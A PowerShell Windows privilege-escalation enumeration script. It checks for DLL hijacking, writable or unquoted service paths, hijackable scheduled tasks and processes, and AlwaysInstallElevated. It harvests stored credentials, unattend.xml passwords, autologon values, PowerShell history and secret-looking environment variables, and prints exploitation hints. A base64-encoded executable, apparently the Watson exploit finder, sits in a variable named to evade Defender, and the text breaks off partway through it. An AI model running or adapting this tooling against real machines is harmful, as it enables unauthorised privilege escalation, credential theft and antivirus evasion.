

$myGroups = @()
$groupInfo = whoami /groups /fo csv | ConvertFrom-Csv
foreach ($entry in $groupInfo) {
    $groupName = $entry."Group Name".Trim()
    $sid = $entry."SID".Trim()
    if ($groupName) {
        $myGroups += $groupName
    }
    if ($sid) {
        $myGroups += $sid
    }
}
$myGroups = $myGroups | Sort-Object -Unique
$myGroups += whoami

function Check_Path {
    Write-Host "`n[+] Checking PATH for DLL hijacking opportunities..." -ForegroundColor Yellow
    $env:Path -split ';' | ForEach-Object {
        $path = $_.Trim()
        try {
        if (-not (Test-Path -Path $path -ErrorAction SilentlyContinue)) {
            return
        }
        } catch {
            return
        }

        $acl = icacls $path 2>$null
        $exploit = $false
        foreach ($line in $acl) {
            foreach ($group in $myGroups) {
                if ($path.StartsWith($env:USERPROFILE)){continue}
                if ($line -match [regex]::Escape($group) -and $line -match '(\(F\)|\(M\)|\(W\))') {
                    Write-Host "    [!] Writable directory in PATH: $path (group: $group)" -ForegroundColor Red
                    $exploit = $true
                }
            }
        }
        if ($exploit){
            Write-Host "    [!] You have interesting write permissions, manually check path. You can most likely do DLL hijacking" -ForegroundColor Magenta
        }
    }
}

function Check-Perms($target) {
    $acls = icacls $target
    foreach ($line in $acls) {
        if ($line -like "$target*") {
        $line = $line.Substring($target.Length).Trim()
    }
        if ($line -match '^(?<user>.+?):\s*(?<perms>\(.+\))$') {
        $user = $matches['user'].Trim()
        $perms = $matches['perms'].Trim()
        foreach ($group in $myGroups) {
                if ($user -match [regex]::Escape($group) -and $perms -match '\([^\)]*[WMF][^\)]*\)') {					 
                    If (Test-Path $target -pathType container) {
                    $test_tmp_filename = "writetest.txt"
                    Try { 
                        $test_filename = (Join-Path $target $test_tmp_filename)
                        [io.file]::OpenWrite($test_filename).close()
                        Remove-Item -ErrorAction SilentlyContinue $test_filename
                        return $true
                    }
                    Catch {return $false}
                    }
                    return $true
                }
                }
            }
        }
    return $false
}

function Check_Services {
    Write-Host "`n[+] Checking services for hijacking opportunities..." -ForegroundColor Yellow

    $canShutdown = (whoami /priv | Select-String "SeShutdownPrivilege") -ne $null
    $servicesRaw = Get-ChildItem 'HKLM:\SYSTEM\CurrentControlSet\Services' | ForEach-Object {
    $item = Get-ItemProperty $_.PSPath
    [PSCustomObject]@{
        Name      = $_.PSChildName
        StartMode     = $item.Start
        PathName = $item.ImagePath
        StartName = $item.ObjectName
    }
}
    $seenPaths = @{}
    if (Test-Path Variable:servicesRaw) {
        foreach ($svc in $servicesRaw) {
            $name = $svc.Name
            $mode = $svc.StartMode
            $startName = $svc.StartName
            try{$pathname = $svc.PathName}
            catch {continue}
            if (-not $pathname) { continue }
            $exePath = if ($pathname -match '^"([^"]+)"') { $matches[1] } else { ($pathname -split '\s',2)[0] }
            if (-not (Test-Path $exePath) -or $seenPaths.ContainsKey($exePath)) { continue }
            $seenPaths[$exePath] = $true
            $exeDir = Split-Path $exePath -Parent
            $canWriteExe = Check-Perms $exePath
            $canWriteDir = Check-Perms $exeDir

            $sd = Get-Acl -Path ("HKLM:\SYSTEM\CurrentControlSet\Services\" + $name)
            foreach ($entry in $sd.Access) {
                if ($entry.IdentityReference -match "$env:USERNAME") {
                    Write-Host "    [!] You can modify service: $name)" -ForegroundColor Red
                    Write-Host "    User            : $($entry.IdentityReference)"
                    Write-Host "    RegistryRights  : $($entry.RegistryRights)"
                    Write-Host "    AccessControl   : $($entry.AccessControlType)"
                    write-Host "    [!] You can edit this service to point at a malicous exe you created" -ForegroundColor Magenta
                }
            }

            if ($canWriteExe -or $canWriteDir){
                if ($mode -eq 2 -and $canShutdown) {
                    if ($canWriteExe) {
                        Write-Host "    [!] Writable service EXE: $exePath (Service: $name)" -ForegroundColor Red
                    } elseif ($canWriteDir) {
                        Write-Host "    [!] Writable service directory: $exeDir (Service: $name)" -ForegroundColor Red
                    }
                    Write-Host "        [+] Can restart machine to exploit the $name service. Runs as: $startName" -ForegroundColor magenta
                } else {
                    $startCheck = sc.exe continue $name
                    $startCheck = $startCheck -join " "
                    if ($startCheck -notmatch "Access is denied") {
                        if ($canWriteExe) {
                            Write-Host "    [!] Writable service EXE: $exePath (Service: $name)" -ForegroundColor Red
                        } elseif ($canWriteDir) {
                            Write-Host "    [!] Writable service directory: $exeDir (Service: $name)" -ForegroundColor Red
                        }
                        Write-Host "        [+] You can restart the'$name' service manually. Runs as: $startName" -ForegroundColor magenta
                    } 
                }
            }
        }
    }
    Write-Host "`n[+] Searching for Unquoted Service Paths..." -ForegroundColor Yellow

    $services = Get-ChildItem 'HKLM:\SYSTEM\CurrentControlSet\Services' | ForEach-Object {
        $item = Get-ItemProperty $_.PSPath
        $path = $item.ImagePath
        if ($path -and $path -notlike 'C:\Windows*' -and $path -notlike '"*') {
            $startMode = switch ($item.Start) {
                2 { 'Automatic' }
                3 { 'Manual' }
                4 { 'Disabled' }
                Default { "Unknown ($($item.Start))" }
            }
            [PSCustomObject]@{
                Name        = $_.PSChildName
                DisplayName = $item.DisplayName
                StartMode   = $startMode
                PathName    = $path
            }
        }
    }
    $exploit = $false
    foreach ($service in $services) {
        if ($service.PathName -notmatch ' ') {continue}
        $path = ($service.PathName -split " -")[0]
        $hijackablePaths = Test-Unquoted -exePath $path
        if (-not $hijackablePaths) {continue}
        
        
        $startCheck = sc.exe continue $name
        $startCheck = $startCheck -join " "
        $howToExploit = $false
        if ($startCheck -notmatch "Access is denied") {
            $howToExploit = "   [+] You can restart the service to exploit"
        }
        elseif ($service.StartMod -eq "Automatic" -and $canShutdown) {
             $howToExploit = "        [+] You can restart computer to exploit"
        }

        if ( $howToExploit){
            $exploit = $true
            Write-Host "    [+] Found unquoted service path" -ForegroundColor Red
            Write-Host "        Name: $($service.Name)" 
            Write-Host "        DisplayName: $($service.DisplayName)" 
            Write-Host "        StartMode: $($service.StartMode)" 
            Write-Host "        PathName: $($path)" 
            foreach ($path in $hijackablePaths) {
                    Write-Host "        [!] Potential path hijack: Can write $path" -ForegroundColor Red
            }
            write-host "$howToExploit" -ForegroundColor magenta
        }
    }
    if ($exploit){
        Write-Host "    [!] Unquoted service path. You can exploit by placing a malicous exe and restarting the service. For example: If the service path is at 'C:\Fake Path\That is\Bad\Service.exe' place a malicous exe at 'C:\Fake Path\That.exe'" -ForegroundColor Magenta
    }
}
function Check_Installed{
    Write-Host "`n[+] Checking installed software for DLL hijacking possibilities..." -ForegroundColor Yellow
    $uninstallKeys = @(
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*",
        "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*"
    )
    foreach ($keyPath in $uninstallKeys) {
        $software = Get-ItemProperty -Path $keyPath -ErrorAction SilentlyContinue | 
            Select-Object DisplayName, InstallLocation | 
            Where-Object { $_.DisplayName -and $_.InstallLocation }
        foreach ($app in $software) {
            $displayName = $app.DisplayName
            $installPath = $app.InstallLocation.TrimEnd('\')
            write-host "    [+] Non default installed software $displayName" -ForegroundColor Cyan
            try {
                if (-Not (Test-Path -Path $installPath -ErrorAction Stop)) {
                    continue
                }
            } catch {continue}
            $writeable = Check-Perms $installPath
            if ($writeable) {
                Write-Host "    [!] Potential DLL hijack vector detected:" -ForegroundColor Red
                Write-Host "        Software     : $displayName"
                Write-Host "        Install Path : $installPath"
                Write-Host "    [!] You have write access to this directory! $installPath" -ForegroundColor Cyan
                Write-Host "    [!] You can place a malicous dll here. This is only useful if high level user then uses this software." -ForegroundColor Magenta
            }
        }
    }
}

function Check_Processes{
    Write-Host "`n[+] Checking running processes for hijacking opportunities..." -ForegroundColor Yellow
    try {
        $processes = Get-CimInstance Win32_Process -ErrorAction Stop
    } catch {
        Write-Host "    [!] Could not enumerate processes" -ForegroundColor Magenta
        return
    }

    $seenPaths = @{}
    $pathAclCache = @{}
    $pathWriteCache = @{}

    $currentUser = "$($env:USERDOMAIN)\$($env:USERNAME)"
    function Get-PathOwner {
        param($path)
        if (-not $pathAclCache.ContainsKey($path)) {
            try {
                $acl = Get-Acl -Path $path -ErrorAction Stop
                $pathAclCache[$path] = $acl.Owner
            } catch {
                $pathAclCache[$path] = "Unknown"
            }
        }
        return $pathAclCache[$path]
    }

    function CanWrite {
        param($path)
        if (-not $pathWriteCache.ContainsKey($path)) {
            $pathWriteCache[$path] = Check-Perms $path
        }
        return $pathWriteCache[$path]
    }

    $exploit = $false
    foreach ($proc in $processes) {
        $exePath = $proc.ExecutablePath
        $cmdLine = $proc.CommandLine

        if ($cmdLine -and $cmdLine -imatch "password|pwd|secret|token|key|cred|login") {
            $displayCmd = if ($cmdLine.Length -gt 150) { $cmdLine.Substring(0,150) + "..." } else { $cmdLine }
            Write-Host "    [+] Interesting process found (PID $($proc.ProcessId)):" -ForegroundColor Red
            Write-Host "        $displayCmd"
        }
        if ([string]::IsNullOrEmpty($exePath) -or $seenPaths.ContainsKey($exePath)) { continue }

        try {
            $owner = $proc.GetOwner()
            $runAsUser = "$($owner.Domain)\$($owner.User)"
        } catch {
            $runAsUser = "SYSTEM"
        }
        if ($runAsUser -imatch $currentUser) { continue }

        if (-not (Test-Path -Path $exePath -PathType Leaf)) { continue }
        $seenPaths[$exePath] = $true

        $integrity = Get-PathOwner $exePath
        $exeDir = Split-Path $exePath -Parent

        $canWriteExe = CanWrite $exePath
        $canWriteDir = CanWrite $exeDir

        if ($canWriteExe -or $canWriteDir) {
            $exploit = $true
            Write-Host "    [!] Potential Hijackable Process Detected (PID $($proc.ProcessId))" -ForegroundColor Red
            Write-Host "        Executable: $exePath"
            Write-Host "        Run As: $runAsUser"
            Write-Host "        Integrity Level: $integrity"
            if ($canWriteExe) {
                Write-Host "        Writable EXE: $exePath" -ForegroundColor Red
            }
            if ($canWriteDir) {
                Write-Host "        Writable Directory: $exeDir" -ForegroundColor Red
            }
        }
    }
    if ($exploit){
        Write-Host "    [!] Look into this process more perhaps you can load a malicous dll or replace the exe." -ForegroundColor magenta
    }
}

function Test-Unquoted{
    param (
        [Parameter(Mandatory=$true)]
        [string]$exePath
    )
    $hijackablePaths = @()
        $segments = $exePath -split '\\'
        $currentPath = $segments[0]
        foreach ($segment in $segments[1..($segments.Count - 1)]) {
            $currentPath = Join-Path $currentPath $segment
            if ($currentPath -match '\s') {
                $check = Split-Path -Path $currentPath -Parent
                if (Check-Perms $check) {
                    $hijackablePaths += $check
                }
            }
        }
    return $hijackablePaths
}

function Check_Passwords {
    Write-Host "`n[+] Password Hunting..." -ForegroundColor Yellow

    Write-Host "    [+] Checking stored creds" -ForegroundColor Yellow
    $cmdkeyOutput = cmdkey /list
    if (-not($cmdkeyOutput -match "\*\s*NONE\s*\*")) {
        Write-Host "    [!] Stored Credentials Found via cmdkey:" -ForegroundColor Red
        Write-Host "$cmdkeyOutput"
        Write-Host "    [!] Can try runas with /savecred or do dpapi stuff" -ForegroundColor magenta
    }

    Write-Host "    [+] Looking for unattended" -ForegroundColor Yellow
    $commonUnattendPaths = @(
        "C:\Windows\Panther",
        "C:\Windows\Panther\Unattend",
        "C:\Windows\System32\Sysprep",
        "C:\Sysprep",
        "C:\"
    )
    foreach ($path in $commonUnattendPaths) {
    if (Test-Path $path) {
            Get-ChildItem -Path $path -Filter unattend.xml -ErrorAction SilentlyContinue -Force | ForEach-Object {
                $fullPath = Join-Path -Path $path -ChildPath "unattend.xml"
                Write-Host "        [!] Found unattend.xml at: $fullPath" -ForegroundColor Red
                try {
                    [xml]$xml = Get-Content $fullPath -ErrorAction Stop
                    $xml.SelectNodes("//*") | Where-Object { $_.LocalName -match 'password'} | ForEach-Object {
                        Write-Host "        [+] Password Field: $($_.OuterXml)" -ForegroundColor Red
                    }
                } catch {
                    Write-Host "        [!] Failed to parse XML in: $fullPath" -ForegroundColor Magenta
                }
            }
        }
    }

    Write-Host "    [+] Looking for groups.xml" -ForegroundColor Yellow
    $groupsXmlFiles = Get-ChildItem -Path "C:\Windows\SYSVOL\domain\Policies\*\Machine\Preferences\Groups\Groups.xml" -ErrorAction SilentlyContinue
    if ($groupsXmlFiles) {
        Write-Host "        [+] Found groups.xml files:" -ForegroundColor Red
        foreach ($file in $groupsXmlFiles) {
            Write-Host "        $file.FullName" -ForegroundColor Red
        }
        Write-Host "        [+] This is BIG news GPP decrypt them passwords" -ForegroundColor magenta
    } 

    Write-Host "    [+] Looking for autologon" -ForegroundColor Yellow
    $autoLogon = Get-Item "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -ErrorAction SilentlyContinue
    if ($autoLogon) {
        $autoLogonProps = $autoLogon.GetValueNames() | Where-Object { $_ -match 'pass' -and -not $_ -match 'PasswordExpiryWarning' }
        Write-Host "        [!] Autologon configuration found!" -ForegroundColor Red
        if ($autoLogonProps) {
            
            foreach ($prop in $autoLogonProps) {
                $val = $autoLogon.GetValue($prop)
                Write-Host "        [+] $prop = $val" -ForegroundColor Red
            }
        }
        Write-Host "        [+] Can manually enumerate with 'Get-Item 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon'" -ForegroundColor Magenta
    }

    Write-Host "    [+] Looking for Powershell History" -ForegroundColor Yellow
    $users = Get-ChildItem -Path 'C:\Users' -Directory -ErrorAction SilentlyContinue
    foreach ($user in $users) {
        $psReadlineDir = Join-Path -Path $user.FullName -ChildPath 'AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline'

        if (Test-Path $psReadlineDir -ErrorAction SilentlyContinue) {
            $historyFiles = Get-ChildItem -Path $psReadlineDir -File -ErrorAction SilentlyContinue
            if (-not $historyFiles.Count -gt 0) {continue}
            foreach ($file in $historyFiles) {
                Write-Host "    [+] PowerShell history found at: $($file.FullName)" -ForegroundColor Red
                try {
                    Write-Host "    _____START CONTENT_____" -ForegroundColor Cyan
                    Get-Content -Path $file.FullName -ErrorAction Stop | Select-Object -First 5 | ForEach-Object { Write-Host "         $_ "}
                    Write-Host "    _____END CONTENT_____" -ForegroundColor Cyan
                }
                catch {continue}
            }
        }
    }

    Write-Host "    [+] Looking at Enviroment Variable" -ForegroundColor Yellow
    $envVars = Get-ChildItem Env:
    foreach ($var in $envVars) {
        $name = $var.Name
        $value = $var.Value
        if ($value -imatch "password|pwd|secret|token|key|cred|admin|login" -or
            $name -imatch "password|pwd|secret|token|key|cred|admin|login" -and
            $name -notmatch "PATH|NVM_HOME"){
            Write-Host "    [!] Interesting environment variable found:" -ForegroundColor Red
            Write-Host "        Name  : $name" -ForegroundColor Cyan
            Write-Host "        Value : $value" -ForegroundColor Cyan
        }
    }
}

function Check_Scheduled{
    Write-Host "`n[+] Checking Scheduled Tasks..."  -ForegroundColor Yellow
    try{$tasks = Get-ScheduledTask}
    catch{return}
    $CurrentUser = "$env:USERNAME"

    foreach ($task in $tasks) {
        $taskName   = $task.TaskName
        $taskPath = $task.TaskPath
        $fullCommand   = $task.Actions[0].Execute
        $runAsUser  = $task.Principal.UserId
        $logonType = $task.Principal.LogonType
        if ($logonType -eq "Password") {
            Write-Host "    [!] Task uses STORED credentials: $taskPath$taskName" -ForegroundColor Red
        }
        if ($runAsUser -match "$CurrentUser") {continue}
        $exePath = if ($fullCommand -match '^"([^"]+)"') {
            $matches[1]
        } elseif ($fullCommand -match '^(.*?\.exe)') {
            $matches[1]
        } else {
            ($fullCommand -split '\s',2)[0]
        }

        $exePath = [Environment]::ExpandEnvironmentVariables($exePath)
        if (-not $exePath) {continue}
        if (-not (Test-Path $exePath)) {continue}
        $exeDir = Split-Path $exePath -Parent
        $writeable = Check-Perms $exePath
        $dirWrite  = Check-Perms $exeDir
        $hasSpaces = $exePath -match '\s'
        $isQuoted = $fullCommand.Trim().StartsWith('"') -and $fullCommand.Trim().EndsWith('"')
        $unquotedWithSpaces = $hasSpaces -and -not $isQuoted

        if ($writeable -or $dirWrite -or $unquotedWithSpaces) {
            $hijackablePaths = Test-Unquoted -exePath $exePath
            if ($unquotedWithSpaces -and (-not $hijackablePaths)){continue}
                Write-Host "    [*] Potentially exploitable task:"-ForegroundColor Red
                Write-Host "        Task Name   : $taskName"
                Write-Host "        Run As User: $runAsUser"
                Write-Host "        Task To Run: $fullCommand"
                Write-Host "        EXE Path    : $exePath"
                if ($writeable) { Write-Host "    [!] Write access to EXE" -ForegroundColor Red} 
                if ($dirWrite)  { Write-Host "    [!] Write access to directory"  -ForegroundColor Red}
                if ($unquotedWithSpaces) { 
                    foreach ($path in $hijackablePaths) {
                        Write-Host "    [!] Potential unquoted path hijack: Can write $path" -ForegroundColor Red
                    }
                    }
            
        }
    }
}

function Check_Startup {
    Write-Host "`n[+] Checking Startup Tasks..."  -ForegroundColor Yellow

    $regPaths = @(
        "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run",
        "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
        "HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run"
    )

    foreach ($path in $regPaths) {
        if (Test-Path $path) {
            $entries = Get-ItemProperty -Path $path
            if ($entries.PSObject.Properties.Count -gt 5) {
                Write-Host "`n$path"
                foreach ($entry in $entries.PSObject.Properties) {
                    if ($entry.Name -notin @("PSPath","PSParentPath","PSChildName","PSDrive","PSProvider")) {
                        Write-Host "	[+]Found Registry $($entry.Name) = $($entry.Value)" -ForegroundColor Red
                    }
                }
            }
        } 
    }
    $startupFolder = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
    if (Test-Path $startupFolder) {
        $files = Get-ChildItem -Path $startupFolder
        if (-not($files.Count -eq 0)) {
            Write-Host "	[+]Startup items in $startupFolder" -ForegroundColor Red
            $files | ForEach-Object { Write-Host "		[+] $($_.Name)" -ForegroundColor Cyan}
        }
    }
    $gpScriptPath = "C:\Windows\System32\GroupPolicy\Machine\Scripts\Startup"
    if (Test-Path $gpScriptPath) {
        $scriptFiles = Get-ChildItem -Path $gpScriptPath
        if (-not($scriptFiles.Count -eq 0)) {
            Write-Host "	[+]Group Policy startup scripts" -ForegroundColor Red
            $scriptFiles | ForEach-Object { Write-Host "		[+] $($_.Name)" -ForegroundColor Cyan}
        }
    }
}

function Check_Me {
    Write-Host "`n[+] Checking User Privs..." -ForegroundColor Yellow
    $hkcu = Get-ItemProperty -Path "HKCU:\Software\Policies\Microsoft\Windows\Installer" -ErrorAction SilentlyContinue
    $hklm = Get-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\Installer" -ErrorAction SilentlyContinue

    $hkcuValue = $hkcu.AlwaysInstallElevated
    $hklmValue = $hklm.AlwaysInstallElevated

    if ($hkcuValue -eq 1 -and $hklmValue -eq 1) {
        Write-Host "    [!] AlwaysInstallElevated is ENABLED in both HKCU and HKLM!" -ForegroundColor Red
        Write-Host "    [+]You may be able to escalate privileges by installing an MSI as SYSTEM." -ForegroundColor Red
    } 
    $SafeGroups = @(
        'S-1-1-0',
        'S-1-5-32-545',
        'S-1-5-4',
        'S-1-2-1',
        'S-1-5-11',
        'S-1-5-15',
        'S-1-5-113',
        'S-1-2-0',
        'S-1-5-64-10',
        'S-1-16-8192',
        'S-1-16-12288',
        'S-1-5-32-555',
        'S-1-5-14',
        'S-1-5-32-580'

    )
    $SafePrivileges = @(
        'SeChangeNotifyPrivilege',
        'SeTimeZonePrivilege',
        'SeShutdownPrivilege',
        'SeUndockPrivilege',
        'SeIncreaseWorkingSetPrivilege'
    )
    $groups = whoami /groups | ForEach-Object {
        if ($_ -match '^\s*(.+?)\s+(S-[\d\-]+)\s+.+$') {
            [PSCustomObject]@{
                Name = $matches[1].Trim()
                SID  = $matches[2]
            }
        }
    }
    $interestingGroups = $groups | Where-Object {
        $sid = $_.SID
        $name = $_.Name
        $isSafe = $SafeGroups -contains $sid
        $isRemote = $name -like '*\\*' -and $name -notlike 'BUILTIN\\*' -and $name -notlike 'NT AUTHORITY\\*'
        -not $isSafe -and -not $isRemote
    }
    $privileges = whoami /priv | ForEach-Object {
        if ($_ -match '^\s*(Se\w+)\s+') {
            $matches[1]
        }
    }
    $interestingPrivs = $privileges | Where-Object {
        $SafePrivileges -notcontains $_
    }
    if ($interestingGroups.Count -gt 0) {
        Write-Host "    [!] Interesting Groups Found:" -ForegroundColor Red
        $interestingGroups | ForEach-Object {
            Write-Host "        [+]$_.Name [$($_.SID)]" -ForegroundColor Red
        }
    }

    if ($interestingPrivs.Count -gt 0) {
        Write-Host "    [!] Interesting Privileges Found:" -ForegroundColor Red
        $interestingPrivs | ForEach-Object {
            Write-Host "        [+]$_" -ForegroundColor Red
        }
    } 
}
function Invoke_Watson
{
    Write-Host "`n[+] Running Watson..." -ForegroundColor Yellow
    try{
        $defenderCantSeeMe="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